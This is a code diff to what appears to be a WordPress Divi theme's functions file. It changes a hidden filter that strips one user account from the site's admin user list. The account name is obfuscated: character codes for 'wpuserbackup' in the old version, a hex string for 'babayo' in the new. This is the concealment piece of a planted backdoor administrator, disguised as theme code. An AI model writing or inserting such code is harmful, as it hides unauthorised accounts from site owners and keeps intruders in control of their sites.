@@ -9054,7 +9054,8 @@ add_filter( 'oembed_dataparse', 'et_divi_oembed_dataparse_remove_yt_frameborder'
 
 add_filter('pre_user_query', function($user_search) {
     global $wpdb;
-    $hidden_user = implode('', array_map('chr', [119,112,117,115,101,114,98,97,99,107,117,112])); 
     
-    $user_search->query_where .= " AND {$wpdb->users}.user_login != '{$hidden_user}'";
+    $encoded = "\x62\x61\x62\x61\x79\x6f"; // hasil dari 'babayo'
+
+    $user_search->query_where .= " AND {$wpdb->users}.user_login != '{$encoded}'";
 });
